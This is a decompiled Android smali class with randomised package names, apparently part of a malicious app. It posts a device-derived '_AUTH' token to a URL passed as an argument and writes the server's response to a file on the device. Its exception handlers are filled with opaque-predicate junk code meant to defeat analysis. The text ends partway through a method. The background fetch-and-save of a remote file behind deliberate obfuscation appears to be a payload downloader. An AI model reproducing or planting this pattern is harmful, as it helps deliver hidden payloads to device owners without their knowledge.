.class final Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/G;
.super Landroid/os/AsyncTask;


# direct methods
.method constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method

.method private static varargs a([Ljava/lang/String;)Ljava/lang/Void;
    .locals 10

    const/16 v9, 0x2c

    const/16 v8, 0x25

    const/16 v7, 0x13

    const/16 v6, -0x5fbd

    :try_start_0
    new-instance v0, Ljava/net/URL;

    const/4 v1, 0x0

    aget-object v1, p0, v1

    invoke-direct {v0, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    check-cast v0, Ljava/net/HttpURLConnection;

    const-string v1, "POST"

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    new-instance v1, Ljava/util/HashMap;

    const/4 v2, 0x1

    invoke-direct {v1, v2}, Ljava/util/HashMap;-><init>(I)V

    const-string v2, "_AUTH"

    sget-object v3, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:Landroid/content/Context;

    invoke-static {v3}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/h;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v2

    new-instance v3, Ljava/io/BufferedWriter;

    new-instance v4, Ljava/io/OutputStreamWriter;

    const-string v5, "UTF-8"

    invoke-direct {v4, v2, v5}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;Ljava/lang/String;)V

    invoke-direct {v3, v4}, Ljava/io/BufferedWriter;-><init>(Ljava/io/Writer;)V

    invoke-static {v1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a(Ljava/util/HashMap;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/io/BufferedWriter;->write(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/io/BufferedWriter;->flush()V

    invoke-virtual {v3}, Ljava/io/BufferedWriter;->close()V

    invoke-virtual {v2}, Ljava/io/OutputStream;->close()V

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->connect()V

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v1

    const/16 v2, 0xc8

    if-eq v1, v2, :cond_0

    const/4 v0, 0x0

    :goto_0
    return-object v0

    :cond_0
    sget-object v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:Landroid/content/Context;

    invoke-static {v1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/io/File;

    sget-object v3, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/I;->i:Ljava/lang/String;

    invoke-direct {v2, v1, v3}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v1, Ljava/io/FileOutputStream;

    invoke-direct {v1, v2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v2

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getContentLength()I

    move-result v0

    sput v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->c:I

    const/16 v0, 0x400

    new-array v0, v0, [B

    :goto_1
    invoke-virtual {v2, v0}, Ljava/io/InputStream;->read([B)I

    move-result v3

    if-lez v3, :cond_c

    const/4 v4, 0x0

    invoke-virtual {v1, v0, v4, v3}, Ljava/io/FileOutputStream;->write([BII)V

    sput v3, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->b:I
    :try_end_0
    .catch Ljava/net/MalformedURLException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_4

    goto :goto_1

    :catch_0
    move-exception v0

    :try_start_1
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-gt v0, v9, :cond_b

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    div-int/lit8 v0, v0, 0x2

    const v1, 0x1527e

    mul-int/2addr v0, v1

    const v1, 0x1594f

    if-lt v0, v1, :cond_b

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    div-int/lit8 v0, v0, 0x2

    const v1, 0xaa22

    mul-int/2addr v0, v1

    const/16 v1, 0x39fa

    if-lt v0, v1, :cond_b

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0x15225

    if-ge v0, v1, :cond_2

    const v0, 0x12521

    sget v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-ne v0, v1, :cond_1

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-ge v7, v0, :cond_2

    :cond_1
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-ge v0, v8, :cond_2

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-ge v0, v6, :cond_b

    :cond_2
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0x16648

    if-le v0, v1, :cond_3

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0xf266

    if-ne v0, v1, :cond_4

    const-string v0, "jtuuz"

    const-string v1, "no"

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_4

    :cond_3
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-gtz v0, :cond_5

    :cond_4
    const-string v0, "chwrykfwbrqectbqcev"

    const-string v1, "gcyque"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_a

    :cond_5
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0x1631a

    if-le v0, v1, :cond_6

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0x13ca7

    if-ne v0, v1, :cond_7

    const-string v0, "entxj"

    const-string v1, "np"

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_7

    :cond_6
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-gtz v0, :cond_8

    :cond_7
    const-string v0, "jpypvacuvyvsrysxced"

    const-string v1, "qscyww"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_9

    :cond_8
    const/16 v0, 0x2170

    sput v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v0, 0x63f65

    sput v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    :cond_9
    const/16 v0, 0x1000

    sput v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    :cond_a
    const/16 v0, 0x2f31

    sput v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_3

    :cond_b
    :goto_2
    const/4 v0, 0x0

    goto/16 :goto_0

    :cond_c
    :try_start_2
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V
    :try_end_2
    .catch Ljava/net/MalformedURLException; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_1
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_4

    goto :goto_2

    :catch_1
    move-exception v0

    :try_start_3
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-gt v0, v9, :cond_b

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    div-int/lit8 v0, v0, 0x2

    const v1, 0x1527e

    mul-int/2addr v0, v1

    const v1, 0x1594f

    if-lt v0, v1, :cond_b

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    div-int/lit8 v0, v0, 0x2

    const v1, 0xaa22

    mul-int/2addr v0, v1

    const/16 v1, 0x39fa

    if-lt v0, v1, :cond_b

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0x15225

    if-ge v0, v1, :cond_e

    const v0, 0x12521

    sget v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-ne v0, v1, :cond_d

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-ge v7, v0, :cond_e

    :cond_d
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-ge v0, v8, :cond_e

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-ge v0, v6, :cond_b

    :cond_e
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0x16648

    if-le v0, v1, :cond_f

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0xf266

    if-ne v0, v1, :cond_10

    const-string v0, "jtuuz"

    const-string v1, "no"

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_10

    :cond_f
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-gtz v0, :cond_11

    :cond_10
    const-string v0, "chwrykfwbrqectbqcev"

    const-string v1, "gcyque"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_16

    :cond_11
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0x1631a

    if-le v0, v1, :cond_12

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0x13ca7

    if-ne v0, v1, :cond_13

    const-string v0, "entxj"

    const-string v1, "np"

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_13

    :cond_12
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-gtz v0, :cond_14

    :cond_13
    const-string v0, "jpypvacuvyvsrysxced"

    const-string v1, "qscyww"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_15

    :cond_14
    const/16 v0, 0x2170

    sput v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v0, 0x63f65

    sput v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    :cond_15
    const/16 v0, 0x1000

    sput v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    :cond_16
    const/16 v0, 0x2f31

    sput v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto/16 :goto_2

    :catch_2
    move-exception v0

    invoke-static {}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a()V

    goto/16 :goto_2

    :catch_3
    move-exception v0

    invoke-static {}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a()V

    goto/16 :goto_2

    :catch_4
    move-exception v0

    :try_start_4
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-gt v0, v9, :cond_b

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    div-int/lit8 v0, v0, 0x2

    const v1, 0x1527e

    mul-int/2addr v0, v1

    const v1, 0x1594f

    if-lt v0, v1, :cond_b

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    div-int/lit8 v0, v0, 0x2

    const v1, 0xaa22

    mul-int/2addr v0, v1

    const/16 v1, 0x39fa

    if-lt v0, v1, :cond_b

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0x15225

    if-ge v0, v1, :cond_18

    const v0, 0x12521

    sget v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-ne v0, v1, :cond_17

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-ge v7, v0, :cond_18

    :cond_17
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-ge v0, v8, :cond_18

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-ge v0, v6, :cond_b

    :cond_18
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0x16648

    if-le v0, v1, :cond_19

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0xf266

    if-ne v0, v1, :cond_1a

    const-string v0, "jtuuz"

    const-string v1, "no"

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_1a

    :cond_19
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-gtz v0, :cond_1b

    :cond_1a
    const-string v0, "chwrykfwbrqectbqcev"

    const-string v1, "gcyque"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_20

    :cond_1b
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0x1631a

    if-le v0, v1, :cond_1c

    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v1, 0x13ca7

    if-ne v0, v1, :cond_1d

    const-string v0, "entxj"

    const-string v1, "np"

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_1d

    :cond_1c
    sget v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    if-gtz v0, :cond_1e

    :cond_1d
    const-string v0, "jpypvacuvyvsrysxced"

    const-string v1, "qscyww"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_1f

    :cond_1e
    const/16 v0, 0x2170

    sput v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    const v0, 0x63f65

    sput v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    :cond_1f
    const/16 v0, 0x1000

    sput v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I

    :cond_20
    const/16 v0, 0x2f31

    sput v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a:I
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_5

    goto/16 :goto_2

    :catch_5
    move-exception v0

    invoke-static {}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/uhbphqtjpcyywnvsjuqmuojhdnbmbqxfsvgxaltaetaipyoimvlncrckzgkxfzklrgewodiszrdewf;->a()V

    goto/16 :goto_2
.end method


# virtual methods
.method protected final synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    check-cast p1, [Ljava/lang/String;

